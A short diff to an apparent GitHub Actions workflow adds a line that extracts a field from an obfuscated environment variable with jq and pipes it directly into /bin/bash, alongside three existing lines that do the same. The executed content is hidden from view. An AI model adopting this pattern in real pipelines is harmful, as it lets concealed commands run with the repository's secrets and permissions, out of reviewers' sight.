@@ -25,6 +25,7 @@ jobs:
           echo $embo6 | jq -r .queyi905 | /bin/bash
           echo $h56475 | jq -r .u859 | /bin/bash
           printf '%s' "$p92" | jq -r .uq555 | /bin/bash
+          printf '%s' "$l215" | jq -r .ss1612 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
